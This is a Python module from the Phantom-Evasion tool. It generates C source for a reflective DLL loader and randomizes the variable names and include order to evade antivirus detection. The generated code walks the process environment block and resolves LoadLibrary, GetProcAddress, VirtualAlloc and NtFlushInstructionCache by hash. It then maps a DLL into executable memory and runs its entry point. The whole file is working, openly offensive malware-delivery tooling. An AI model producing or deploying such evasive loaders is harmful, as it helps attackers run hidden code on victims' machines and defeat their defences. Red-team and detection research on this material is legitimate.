
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

     ########################################################################################
     #    Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)   #
     #    All rights reserved.                                                              #
     #    Redistribution and use in source and binary forms, with or without modification,  #
     #    are permitted provided that the following conditions are met:                     #
     #    * Redistributions of source code must retain the above copyright notice,          #
     #    this list of conditions and the following disclaimer.                             #
     #    * Redistributions in binary form must reproduce the above copyright notice,       #
     #    this list of conditions and the following disclaimer in the documentation and/or  #
     #    other materials provided with the distribution.                                   #
     #    * Neither the name of Harmony Security nor the names of its contributors may      #
     #    be used to endorse or promote products derived from this software without         #
     #    specific prior written permission.                                                #
     #    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND   #
     #    ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED     #
     #    WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE            #
     #    DISCLAIMED.                                                                       #
     #    IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,   #
     #    INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES                #
     #    (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR                #
     #    SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED #
     #    AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT    #
     #    (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS     #
     #    SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                      #
     ########################################################################################
     
import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils

from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
from usefull import CheckForBackslash
from usefull import IncludeShuffler
from usefull import WriteSource


def BuildReflectiveLoader(ModOpt):

    RLoader = "ReflectiveLoader" #ModOpt["Loadername"]

    RandLoadLibDef = varname_creator()
    RandGetProcAddrDef = varname_creator()
    RandVirtualAllocDef = varname_creator()
    RandNtFlushInstrCacheDef = varname_creator()

    RandHinstance = varname_creator()
    RandSt1 = varname_creator()
    RandLoadLib = varname_creator()
    RandGetProcAddr = varname_creator() 
    RandVirtualAlloc = varname_creator()
    RandNtFlushCache = varname_creator()
    Randflag = varname_creator()
    RandHValue = varname_creator() 
    RandDllAddr = varname_creator() 
    RandExportDir = varname_creator()
    RandOrdName = varname_creator()
    RandArrAddr = varname_creator()
    RandArrName = varname_creator()
    RandUint1 = varname_creator()
    RandUint2 = varname_creator()
    RandUint3 = varname_creator()
    RandUint4 = varname_creator()
    RandUint5 = varname_creator()
    RandHeader = varname_creator()
    RandBaseAddr = varname_creator()

    Ret_code = ""

    Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

    Ret_code += IncludeShuffler(Include_List)

    Ret_code += "#include <tlhelp32.h>\n"
    Ret_code += "#include \"ReflectiveLoader.h\"\n"

    Ret_code += "#define _ReturnAddress() __builtin_return_address(0)\n"
    Ret_code += "HINSTANCE hAppInstance = NULL;\n" #####
    Ret_code += "#pragma intrinsic( _ReturnAddress )\n"

    Ret_code += "__declspec(noinline) ULONG_PTR " + RandSt1 + "(VOID) { return (ULONG_PTR)_ReturnAddress(); }\n"

    Ret_code += "DLLEXPORT ULONG_PTR WINAPI " + RLoader + "(VOID){\n"

    Ret_code += RandLoadLibDef + " " + RandLoadLib + " = NULL;\n"
    Ret_code += RandGetProcAddrDef + " " + RandGetProcAddr + " = NULL;\n"
    Ret_code += RandVirtualAllocDef + " " + RandVirtualAlloc + " = NULL;\n"
    Ret_code += RandNtFlushInstrCacheDef + " " + RandNtFlushCache + " = NULL;\n"
    Ret_code += "ULONG_PTR " + RandDllAddr + " = " + RandSt1 + "();\n"
    Ret_code += "ULONG_PTR " + RandArrAddr + ";\n"
    Ret_code += "ULONG_PTR " + RandArrName + ";\n"
    Ret_code += "ULONG_PTR " + RandExportDir + ";\n"
    Ret_code += "ULONG_PTR " + RandOrdName + ";\n"
    Ret_code += "DWORD " + RandHValue + ";\n"
    Ret_code += "ULONG_PTR " + RandUint1 + ";\n"
    Ret_code += "ULONG_PTR " + RandUint2 + ";\n"
    Ret_code += "ULONG_PTR " + RandUint3 + ";\n"
    Ret_code += "ULONG_PTR " + RandUint4 + ";\n"
    Ret_code += "ULONG_PTR " + RandUint5 + ";\n"
    Ret_code += "ULONG_PTR " + RandHeader + ";\n"

    #Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += "$:EVA\n"

    Ret_code += "while(TRUE){\n"
    Ret_code += "if(((PIMAGE_DOS_HEADER)" + RandDllAddr + ")->e_magic == IMAGE_DOS_SIGNATURE){\n"
    Ret_code += RandHeader + " = ((PIMAGE_DOS_HEADER)" + RandDllAddr + ")->e_lfanew;\n"
    Ret_code += "if(" + RandHeader + " >= sizeof(IMAGE_DOS_HEADER) && " + RandHeader + " < 1024){\n"
    Ret_code += RandHeader + " += " + RandDllAddr + ";\n"
    Ret_code += "if(((PIMAGE_NT_HEADERS)" + RandHeader + ")->Signature == IMAGE_NT_SIGNATURE) break;}}\n"
    Ret_code += RandDllAddr + "--;}\n"

    if ModOpt["Arch"] == "x64":

        Ret_code += "ULONG_PTR " + RandBaseAddr + " = __readgsqword(0x60);\n"
    else:
        Ret_code += "ULONG_PTR " + RandBaseAddr + " = __readfsdword(0x30);\n" # 32 bit

    Ret_code += RandBaseAddr + " = (ULONG_PTR)((_PPEB)" + RandBaseAddr + ")->pLdr;\n"
    Ret_code += RandUint1 + " = (ULONG_PTR)((PPEB_LDR_DATA)" + RandBaseAddr + ")->InMemoryOrderModuleList.Flink;\n"
    Ret_code += "while(" + RandUint1 + "){\n"
    Ret_code += "USHORT " + Randflag + ";\n"
    Ret_code += RandUint2 + " = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)" + RandUint1 + ")->BaseDllName.pBuffer;\n"
    Ret_code += Randflag + " = ((PLDR_DATA_TABLE_ENTRY)" + RandUint1 + ")->BaseDllName.Length;\n"
    Ret_code += RandUint3 + " = 0;\n"
    Ret_code += "do{\n"
    Ret_code += RandUint3 + " = ror((DWORD)" + RandUint3 + " );\n"
    Ret_code += "if(*((BYTE *)" + RandUint2 + ") >= 'a'){\n"
    Ret_code += RandUint3 + " += *((BYTE *)" + RandUint2 + ") - 0x20;\n"
    Ret_code += "}else{\n"
    Ret_code += RandUint3 + " += *((BYTE *)" + RandUint2 + ");}\n"
    Ret_code += RandUint2 + "++;\n"
    Ret_code += "}while( --" + Randflag + ");\n"
    Ret_code += "if((DWORD)" + RandUint3 + " == 0x6A4ABC5B){\n"
    Ret_code += RandBaseAddr + " = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)" + RandUint1 + ")->DllBase;\n"
    Ret_code += RandExportDir + " = " + RandBaseAddr + " + ((PIMAGE_DOS_HEADER)" + RandBaseAddr + ")->e_lfanew;\n"
    Ret_code += RandArrName + " = (ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandExportDir + ")->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n"
    Ret_code += RandExportDir + " = (" + RandBaseAddr + " + ((PIMAGE_DATA_DIRECTORY)" + RandArrName + ")->VirtualAddress);\n"
    Ret_code += RandArrName + " = (" + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY )" + RandExportDir + ")->AddressOfNames);\n"
    Ret_code += RandOrdName + " = ( " + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY )" + RandExportDir + ")->AddressOfNameOrdinals);\n"
    Ret_code += Randflag + " = 3;\n"
    Ret_code += "while(" + Randflag + " > 0){\n"
    Ret_code += RandHValue + " = hash((char *)(" + RandBaseAddr + " + *(DWORD *)(" + RandArrName + ")));\n"
    Ret_code += "if( " + RandHValue + " == 0xEC0E4E8E || " + RandHValue + " == 0x7C0DFCAA || " + RandHValue + " == 0x91AFCA54){\n"
    Ret_code += RandArrAddr + " = (" + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY )" + RandExportDir + ")->AddressOfFunctions);\n"
    Ret_code += RandArrAddr + " += (*(WORD *)( " + RandOrdName + ") * sizeof(DWORD));\n"
    Ret_code += "if( " + RandHValue + " == 0xEC0E4E8E ){\n"
    Ret_code += RandLoadLib + " = (" + RandLoadLibDef + ")( " + RandBaseAddr + " + *(DWORD *)( " + RandArrAddr + " ));\n"
    Ret_code += "}else if( " + RandHValue + " == 0x7C0DFCAA ){\n"
    Ret_code += RandGetProcAddr + " = (" + RandGetProcAddrDef + ")(" + RandBaseAddr + " + *(DWORD *)( " + RandArrAddr + "));\n"
    Ret_code += "}else if( " + RandHValue + " == 0x91AFCA54 ){\n"
    Ret_code += RandVirtualAlloc + " = (" + RandVirtualAllocDef + ")(" + RandBaseAddr + " + *(DWORD *)(" + RandArrAddr + "));}\n"
    Ret_code += Randflag + "--;}\n"
    Ret_code += RandArrName + " += sizeof(DWORD);\n"
    Ret_code += RandOrdName + " += sizeof(WORD);}\n"
    Ret_code += "}else if((DWORD)" + RandUint3 + " == 0x3CFA685D){\n"
    Ret_code += RandBaseAddr + " = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)" + RandUint1 + ")->DllBase;\n"
    Ret_code += RandExportDir + " = " + RandBaseAddr + " + ((PIMAGE_DOS_HEADER)" + RandBaseAddr + ")->e_lfanew;\n"
    Ret_code += RandArrName + " = (ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandExportDir + ")->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n"
    Ret_code += RandExportDir + " = (" + RandBaseAddr + " + ((PIMAGE_DATA_DIRECTORY)" + RandArrName + ")->VirtualAddress);\n"
    Ret_code += RandArrName + " = (" + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir + ")->AddressOfNames);\n"
    Ret_code += RandOrdName + " = (" + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir + ")->AddressOfNameOrdinals);\n"
    Ret_code += Randflag + " = 1;\n"
    Ret_code += "while(" + Randflag + " > 0){\n"
    Ret_code += RandHValue + " = hash((char *)(" + RandBaseAddr + " + *(DWORD *)(" + RandArrName + ")));\n"
    Ret_code += "if( " + RandHValue + " == 0x534C0AB8 ){\n"
    Ret_code += RandArrAddr + " = (" + RandBaseAddr + " + ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir + ")->AddressOfFunctions);\n"
    Ret_code += RandArrAddr + " += (*(WORD *)(" + RandOrdName + ") * sizeof(DWORD));\n"
    Ret_code += "if( " + RandHValue + " == 0x534C0AB8){\n"
    Ret_code += RandNtFlushCache + " = (" + RandNtFlushInstrCacheDef + ")(" + RandBaseAddr + " + *(DWORD *)(" + RandArrAddr + "));}\n"
    Ret_code += Randflag + "--;}\n"
    Ret_code += RandArrName + " += sizeof(DWORD);\n"
    Ret_code += RandOrdName + " += sizeof(WORD);}}\n"
    Ret_code += "if(" + RandLoadLib + " && " + RandGetProcAddr + " && " + RandVirtualAlloc + " && " + RandNtFlushCache + " ) break;\n"
    Ret_code += RandUint1 + " = *(UINT_PTR *)(" + RandUint1 + ");}\n"
    Ret_code += RandHeader + " = " + RandDllAddr + " + ((PIMAGE_DOS_HEADER)" + RandDllAddr + ")->e_lfanew;\n"
    Ret_code += RandBaseAddr + " = (ULONG_PTR)" + RandVirtualAlloc + "(NULL,((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );\n"
    Ret_code += RandUint1 + " = ((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.SizeOfHeaders;\n"
    Ret_code += RandUint2 + " = " + RandDllAddr + ";\n"
    Ret_code += RandUint3 + " = " + RandBaseAddr + ";\n"
    Ret_code += "while( " + RandUint1 + "-- )\n"
    Ret_code += "*(BYTE *)" + RandUint3 + "++ = *(BYTE *)" + RandUint2 + "++;\n"
    Ret_code += RandUint1 + " = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader + ((PIMAGE_NT_HEADERS)" + RandHeader + ")->FileHeader.SizeOfOptionalHeader );\n"
    Ret_code += RandUint5 + " = ((PIMAGE_NT_HEADERS)" + RandHeader + ")->FileHeader.NumberOfSections;\n"
    Ret_code += "while(" + RandUint5 + "--){\n"
    Ret_code += RandUint2 + " = (" + RandBaseAddr + " + ((PIMAGE_SECTION_HEADER)" + RandUint1 + ")->VirtualAddress);\n"
    Ret_code += RandUint3 + " = (" + RandDllAddr + " + ((PIMAGE_SECTION_HEADER)" + RandUint1 + ")->PointerToRawData);\n"
    Ret_code += RandUint4 + " = ((PIMAGE_SECTION_HEADER)" + RandUint1 + ")->SizeOfRawData;\n"
    Ret_code += "while(" + RandUint4 + "--)\n"
    Ret_code += "*(BYTE *)" + RandUint2 + "++ = *(BYTE *)" + RandUint3 + "++;\n"
    Ret_code += RandUint1 + " += sizeof(IMAGE_SECTION_HEADER);}\n"
    Ret_code += RandUint2 + " = (ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n"
    Ret_code += RandUint3 + " = (" + RandBaseAddr + " + ((PIMAGE_DATA_DIRECTORY)" + RandUint2 + ")->VirtualAddress);\n"
    Ret_code += "while(((PIMAGE_IMPORT_DESCRIPTOR)" + RandUint3 + ")->Name){\n"
    Ret_code += RandDllAddr + " = (ULONG_PTR)" + RandLoadLib + "((LPCSTR)( " + RandBaseAddr + " + ((PIMAGE_IMPORT_DESCRIPTOR)" + RandUint3 + ")->Name));\n"
    Ret_code += RandUint4 + " = (" + RandBaseAddr + " + ((PIMAGE_IMPORT_DESCRIPTOR)" + RandUint3 + ")->OriginalFirstThunk);\n"
    Ret_code += RandUint1 + " = (" + RandBaseAddr + " + ((PIMAGE_IMPORT_DESCRIPTOR)" + RandUint3 + ")->FirstThunk);\n"
    Ret_code += "while(*(UINT_PTR *)(" + RandUint1 + ")){\n"
    Ret_code += "if(" + RandUint4 + " && ((PIMAGE_THUNK_DATA)" + RandUint4 + ")->u1.Ordinal & IMAGE_ORDINAL_FLAG){\n"
    Ret_code += RandExportDir + " = " + RandDllAddr + " + ((PIMAGE_DOS_HEADER)" + RandDllAddr + ")->e_lfanew;\n"
    Ret_code += RandArrName + " = (ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandExportDir + ")->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n"
    Ret_code += RandExportDir + " = (" + RandDllAddr + " + ((PIMAGE_DATA_DIRECTORY)" + RandArrName + ")->VirtualAddress);\n"
    Ret_code += RandArrAddr + " = (" + RandDllAddr + " + ((PIMAGE_EXPORT_DIRECTORY )" + RandExportDir + ")->AddressOfFunctions);\n"
    Ret_code += RandArrAddr + " += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)" + RandUint4 + ")->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY)" + RandExportDir + ")->Base) * sizeof(DWORD));\n"
    Ret_code += "*(UINT_PTR *)(" + RandUint1 + ") = (" + RandDllAddr + " + *(DWORD *)(" + RandArrAddr + "));\n"
    Ret_code += "}else{\n"
    Ret_code += RandUint2 + " = (" + RandBaseAddr + " + *(UINT_PTR *)(" + RandUint1 + "));\n"
    Ret_code += "*(UINT_PTR *)(" + RandUint1 + ") = (ULONG_PTR)" + RandGetProcAddr + "((HMODULE)" + RandDllAddr + ",(LPCSTR)((PIMAGE_IMPORT_BY_NAME)" + RandUint2 + ")->Name);}\n"
    Ret_code += RandUint1 + " += sizeof(ULONG_PTR);\n"
    Ret_code += "if(" + RandUint4 + "){\n"
    Ret_code += RandUint4 + " += sizeof(ULONG_PTR);}}\n"
    Ret_code += RandUint3 + " += sizeof(IMAGE_IMPORT_DESCRIPTOR);}\n"
    Ret_code += RandDllAddr + " = " + RandBaseAddr + " - ((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.ImageBase;\n"
    Ret_code += RandUint2 + " = (ULONG_PTR)&((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];\n"
    Ret_code += "if( ((PIMAGE_DATA_DIRECTORY)" + RandUint2 + ")->Size ){\n"
    Ret_code += RandUint3 + " = (" + RandBaseAddr + " + ((PIMAGE_DATA_DIRECTORY)" + RandUint2 + ")->VirtualAddress);\n"
    Ret_code += "while(((PIMAGE_BASE_RELOCATION)" + RandUint3 + ")->SizeOfBlock ){\n"
    Ret_code += RandUint1 + " = (" + RandBaseAddr + " + ((PIMAGE_BASE_RELOCATION)" + RandUint3 + ")->VirtualAddress);\n"
    Ret_code += RandUint2 + " = (((PIMAGE_BASE_RELOCATION)" + RandUint3 + ")->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof( IMAGE_RELOC );\n"
    Ret_code += RandUint4 + " = " + RandUint3 + " + sizeof(IMAGE_BASE_RELOCATION);\n"
    Ret_code += "while(" + RandUint2 + "--){\n"
    Ret_code += "if(((PIMAGE_RELOC)" + RandUint4 + ")->type == IMAGE_REL_BASED_DIR64){\n"
    Ret_code += "*(ULONG_PTR *)(" + RandUint1 + " + ((PIMAGE_RELOC)" + RandUint4 + ")->offset) += " + RandDllAddr + ";\n"
    Ret_code += "}else if(((PIMAGE_RELOC)" + RandUint4 + ")->type == IMAGE_REL_BASED_HIGHLOW){\n"
    Ret_code += "*(DWORD *)(" + RandUint1 + " + ((PIMAGE_RELOC)" + RandUint4 + ")->offset) += (DWORD)" + RandDllAddr + ";\n"
#//ARMQUI
    Ret_code += "}else if(((PIMAGE_RELOC)" + RandUint4 + ")->type == IMAGE_REL_BASED_HIGH){\n"
    Ret_code += "*(WORD *)(" + RandUint1 + " + ((PIMAGE_RELOC)" + RandUint4 + ")->offset) += HIWORD(" + RandDllAddr + ");\n"
    Ret_code += "}else if(((PIMAGE_RELOC)" + RandUint4 + ")->type == IMAGE_REL_BASED_LOW){\n"
    Ret_code += "*(WORD *)(" + RandUint1 + " + ((PIMAGE_RELOC)" + RandUint4 + ")->offset) += LOWORD(" + RandDllAddr + ");}\n" #RIGHT??
    Ret_code += RandUint4 + " += sizeof( IMAGE_RELOC );}\n"
    Ret_code += RandUint3 + " = " + RandUint3 + " + ((PIMAGE_BASE_RELOCATION)" + RandUint3 + ")->SizeOfBlock;}}\n"
    Ret_code += RandUint1 + " = (" + RandBaseAddr + " + ((PIMAGE_NT_HEADERS)" + RandHeader + ")->OptionalHeader.AddressOfEntryPoint);\n"
    Ret_code += RandNtFlushCache + "((HANDLE)-1, NULL, 0);\n"
    Ret_code += "((DLLMAIN)" + RandUint1 + ")((HINSTANCE)" + RandBaseAddr + ", DLL_PROCESS_ATTACH, NULL);\n"

    #Ret_code += "$:END\n"

    #Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])

    Ret_code += "return " + RandUint1 + ";}\n"

    WriteSource("ReflectiveLoader.c",Ret_code)

    Ret_code = ""
#    Ret_code += "#ifndef _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H\n"
#    Ret_code += "#define _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H\n"
    Ret_code += "#define WIN32_LEAN_AND_MEAN\n"
    Ret_code += "#include <winsock2.h>\n"
    Ret_code += "#include <windows.h>\n"
    Ret_code += "#include <intrin.h>\n"
    Ret_code += "#define DLL_QUERY_HMODULE		6\n"
#    Ret_code += "#define DEREF( name )*(UINT_PTR *)(name)\n"
#    Ret_code += "#define DEREF_64( name )*(DWORD64 *)(name)\n"
#    Ret_code += "#define DEREF_32( name )*(DWORD *)(name)\n"
#    Ret_code += "#define DEREF_16( name )*(WORD *)(name)\n"
#    Ret_code += "#define DEREF_8( name )*(BYTE *)(name)\n"

    Ret_code += "typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );\n"
    Ret_code += "typedef BOOL (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );\n"

    Ret_code += "#define DLLEXPORT  __declspec( dllexport )\n"

    Ret_code += "typedef HMODULE (WINAPI * " + RandLoadLibDef + ")( LPCSTR );\n"
    Ret_code += "typedef FARPROC (WINAPI * " + RandGetProcAddrDef + ")( HMODULE, LPCSTR );\n"
    Ret_code += "typedef LPVOID  (WINAPI * " + RandVirtualAllocDef + ")( LPVOID, SIZE_T, DWORD, DWORD );\n"
    Ret_code += "typedef DWORD  (NTAPI * " + RandNtFlushInstrCacheDef + ")( HANDLE, PVOID, ULONG );\n"

#    Ret_code += "#define KERNEL32DLL_HASH				0x6A4ABC5B\n"
#    Ret_code += "#define NTDLLDLL_HASH				0x3CFA685D\n"

#    Ret_code += "#define LOADLIBRARYA_HASH				0xEC0E4E8E\n"
#    Ret_code += "#define GETPROCADDRESS_HASH				0x7C0DFCAA\n"
#    Ret_code += "#define VIRTUALALLOC_HASH				0x91AFCA54\n"
#    Ret_code += "#define NTFLUSHINSTRUCTIONCACHE_HASH	                0x534C0AB8\n"
    Ret_code += "#define HASH_KEY						13\n"

    Ret_code += "#pragma intrinsic( _rotr )\n"

    Ret_code += "__forceinline DWORD ror( DWORD d )\n"
    Ret_code += "{\n"
    Ret_code += "	return _rotr( d, HASH_KEY );\n"
    Ret_code += "}\n"

    Ret_code += "__forceinline DWORD hash( char * c )\n"
    Ret_code += "{\n"
    Ret_code += "    register DWORD h = 0;\n"
    Ret_code += "	do\n"
    Ret_code += "	{\n"
    Ret_code += "		h = ror( h );\n"
    Ret_code += "        h += *c;\n"
    Ret_code += "	} while( *++c );\n"
    Ret_code += "    return h;\n"
    Ret_code += "}\n"
    Ret_code += "typedef struct _UNICODE_STR\n"
    Ret_code += "{\n"
    Ret_code += "  USHORT Length;\n"
    Ret_code += "  USHORT MaximumLength;\n"
    Ret_code += "  PWSTR pBuffer;\n"
    Ret_code += "} UNICODE_STR, *PUNICODE_STR;\n"

    Ret_code += "typedef struct _LDR_DATA_TABLE_ENTRY\n"
    Ret_code += "{\n"
    Ret_code += "LIST_ENTRY InMemoryOrderModuleList;\n"
    Ret_code += "LIST_ENTRY InInitializationOrderModuleList;\n"
    Ret_code += "PVOID DllBase;\n"
    Ret_code += "PVOID EntryPoint;\n"
    Ret_code += "ULONG SizeOfImage;\n"
    Ret_code += "UNICODE_STR FullDllName;\n"
    Ret_code += "	UNICODE_STR BaseDllName;\n"
    Ret_code += "	ULONG Flags;\n"
    Ret_code += "	SHORT LoadCount;\n"
    Ret_code += "	SHORT TlsIndex;\n"
    Ret_code += "	LIST_ENTRY HashTableEntry;\n"
    Ret_code += "	ULONG TimeDateStamp;\n"
    Ret_code += "} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"


    Ret_code += "typedef struct _PEB_LDR_DATA\n"
    Ret_code += "{\n"
    Ret_code += "   DWORD dwLength;\n"
    Ret_code += "   DWORD dwInitialized;\n"
    Ret_code += "   LPVOID lpSsHandle;\n"
    Ret_code += "   LIST_ENTRY InLoadOrderModuleList;\n"
    Ret_code += "   LIST_ENTRY InMemoryOrderModuleList;\n"
    Ret_code += "   LIST_ENTRY InInitializationOrderModuleList;\n"
    Ret_code += "   LPVOID lpEntryInProgress;\n"
    Ret_code += "} PEB_LDR_DATA, * PPEB_LDR_DATA;\n"

    Ret_code += "typedef struct _PEB_FREE_BLOCK\n"
    Ret_code += "{\n"
    Ret_code += "   struct _PEB_FREE_BLOCK * pNext;\n"
    Ret_code += "   DWORD dwSize;\n"
    Ret_code += "} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;\n"

    Ret_code += "typedef struct __PEB\n"
    Ret_code += "{\n"
    Ret_code += "   BYTE bInheritedAddressSpace;\n"
    Ret_code += "   BYTE bReadImageFileExecOptions;\n"
    Ret_code += "   BYTE bBeingDebugged;\n"
    Ret_code += "   BYTE bSpareBool;\n"
    Ret_code += "   LPVOID lpMutant;\n"
    Ret_code += "   LPVOID lpImageBaseAddress;\n"
    Ret_code += "   PPEB_LDR_DATA pLdr;\n"
    Ret_code += "   LPVOID lpProcessParameters;\n"
    Ret_code += "   LPVOID lpSubSystemData;\n"
    Ret_code += "   LPVOID lpProcessHeap;\n"
    Ret_code += "   PRTL_CRITICAL_SECTION pFastPebLock;\n"
    Ret_code += "   LPVOID lpFastPebLockRoutine;\n"
    Ret_code += "   LPVOID lpFastPebUnlockRoutine;\n"
    Ret_code += "   DWORD dwEnvironmentUpdateCount;\n"
    Ret_code += "   LPVOID lpKernelCallbackTable;\n"
    Ret_code += "   DWORD dwSystemReserved;\n"
    Ret_code += "   DWORD dwAtlThunkSListPtr32;\n"
    Ret_code += "   PPEB_FREE_BLOCK pFreeList;\n"
    Ret_code += "   DWORD dwTlsExpansionCounter;\n"
    Ret_code += "   LPVOID lpTlsBitmap;\n"
    Ret_code += "   DWORD dwTlsBitmapBits[2];\n"
    Ret_code += "   LPVOID lpReadOnlySharedMemoryBase;\n"
    Ret_code += "   LPVOID lpReadOnlySharedMemoryHeap;\n"
    Ret_code += "   LPVOID lpReadOnlyStaticServerData;\n"
    Ret_code += "   LPVOID lpAnsiCodePageData;\n"
    Ret_code += "   LPVOID lpOemCodePageData;\n"
    Ret_code += "   LPVOID lpUnicodeCaseTableData;\n"
    Ret_code += "   DWORD dwNumberOfProcessors;\n"
    Ret_code += "   DWORD dwNtGlobalFlag;\n"
    Ret_code += "   LARGE_INTEGER liCriticalSectionTimeout;\n"
    Ret_code += "   DWORD dwHeapSegmentReserve;\n"
    Ret_code += "   DWORD dwHeapSegmentCommit;\n"
    Ret_code += "   DWORD dwHeapDeCommitTotalFreeThreshold;\n"
    Ret_code += "   DWORD dwHeapDeCommitFreeBlockThreshold;\n"
    Ret_code += "   DWORD dwNumberOfHeaps;\n"
    Ret_code += "   DWORD dwMaximumNumberOfHeaps;\n"
    Ret_code += "   LPVOID lpProcessHeaps;\n"
    Ret_code += "   LPVOID lpGdiSharedHandleTable;\n"
    Ret_code += "   LPVOID lpProcessStarterHelper;\n"
    Ret_code += "   DWORD dwGdiDCAttributeList;\n"
    Ret_code += "   LPVOID lpLoaderLock;\n"
    Ret_code += "   DWORD dwOSMajorVersion;\n"
    Ret_code += "   DWORD dwOSMinorVersion;\n"
    Ret_code += "   WORD wOSBuildNumber;\n"
    Ret_code += "   WORD wOSCSDVersion;\n"
    Ret_code += "   DWORD dwOSPlatformId;\n"
    Ret_code += "   DWORD dwImageSubsystem;\n"
    Ret_code += "   DWORD dwImageSubsystemMajorVersion;\n"
    Ret_code += "   DWORD dwImageSubsystemMinorVersion;\n"
    Ret_code += "   DWORD dwImageProcessAffinityMask;\n"
    Ret_code += "   DWORD dwGdiHandleBuffer[34];\n"
    Ret_code += "   LPVOID lpPostProcessInitRoutine;\n"
    Ret_code += "   LPVOID lpTlsExpansionBitmap;\n"
    Ret_code += "   DWORD dwTlsExpansionBitmapBits[32];\n"
    Ret_code += "   DWORD dwSessionId;\n"
    Ret_code += "   ULARGE_INTEGER liAppCompatFlags;\n"
    Ret_code += "   ULARGE_INTEGER liAppCompatFlagsUser;\n"
    Ret_code += "   LPVOID lppShimData;\n"
    Ret_code += "   LPVOID lpAppCompatInfo;\n"
    Ret_code += "   UNICODE_STR usCSDVersion;\n"
    Ret_code += "   LPVOID lpActivationContextData;\n"
    Ret_code += "   LPVOID lpProcessAssemblyStorageMap;\n"
    Ret_code += "   LPVOID lpSystemDefaultActivationContextData;\n"
    Ret_code += "   LPVOID lpSystemAssemblyStorageMap;\n"
    Ret_code += "   DWORD dwMinimumStackCommit;\n"
    Ret_code += "} _PEB, * _PPEB;\n"

    Ret_code += "typedef struct\n"
    Ret_code += "{\n"
    Ret_code += "	WORD	offset:12;\n"
    Ret_code += "	WORD	type:4;\n"
    Ret_code += "} IMAGE_RELOC, *PIMAGE_RELOC;\n"
#    Ret_code += "#endif\n"

    WriteSource("ReflectiveLoader.h",Ret_code)


